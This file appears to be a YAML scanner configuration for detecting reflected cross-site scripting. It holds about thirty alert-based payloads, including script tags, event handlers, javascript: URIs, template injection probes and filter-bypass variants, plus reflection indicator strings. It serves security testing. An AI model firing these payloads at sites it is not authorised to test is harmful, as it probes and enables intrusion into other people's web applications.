name: "Cross-Site Scripting (XSS)"
category: "xss"
severity: "high"
payloads:
  # Basic reflected XSS
  - value: "<script>alert('XSS')</script>"
    detection: "reflected"
  - value: "<script>alert(1)</script>"
    detection: "reflected"
  - value: "<img src=x onerror=alert(1)>"
    detection: "reflected"
  - value: "<svg onload=alert(1)>"
    detection: "reflected"
  - value: "<body onload=alert(1)>"
    detection: "reflected"

  # Event handler based
  - value: "\" onfocus=alert(1) autofocus=\""
    detection: "reflected"
  - value: "' onfocus='alert(1)' autofocus='"
    detection: "reflected"
  - value: "<input onfocus=alert(1) autofocus>"
    detection: "reflected"
  - value: "<details open ontoggle=alert(1)>"
    detection: "reflected"
  - value: "<marquee onstart=alert(1)>"
    detection: "reflected"
  - value: "<video><source onerror=alert(1)>"
    detection: "reflected"
  - value: "<audio src=x onerror=alert(1)>"
    detection: "reflected"

  # Attribute injection
  - value: "\"><script>alert(1)</script>"
    detection: "reflected"
  - value: "'><script>alert(1)</script>"
    detection: "reflected"
  - value: "\"><img src=x onerror=alert(1)>"
    detection: "reflected"
  - value: "'-alert(1)-'"
    detection: "reflected"
  - value: "\"-alert(1)-\""
    detection: "reflected"

  # JavaScript protocol
  - value: "javascript:alert(1)"
    detection: "reflected"
  - value: "javascript:alert(document.domain)"
    detection: "reflected"
  - value: "data:text/html,<script>alert(1)</script>"
    detection: "reflected"

  # Template injection (Angular/Vue)
  - value: "{{constructor.constructor('alert(1)')()}}"
    detection: "reflected"
  - value: "${alert(1)}"
    detection: "reflected"
  - value: "{{7*7}}"
    detection: "reflected"

  # DOM-based probes
  - value: "<img src=x onerror=alert(document.cookie)>"
    detection: "reflected"
  - value: "<svg/onload=alert(String.fromCharCode(88,83,83))>"
    detection: "reflected"

  # Filter bypass variants
  - value: "<ScRiPt>alert(1)</ScRiPt>"
    detection: "reflected"
  - value: "<scr<script>ipt>alert(1)</scr</script>ipt>"
    detection: "reflected"
  - value: "<img src=\"x\" onerror=\"alert(1)\">"
    detection: "reflected"
  - value: "<<script>alert(1)//<</script>"
    detection: "reflected"

indicators:
  - "<script>alert"
  - "onerror=alert"
  - "onload=alert"
  - "onfocus=alert"
  - "ontoggle=alert"
  - "onstart=alert"
  - "javascript:alert"
  - "alert(1)"
  - "alert('XSS')"
  - "alert(document"
  - "<img src=x"
  - "<svg onload"
  - "<svg/onload"
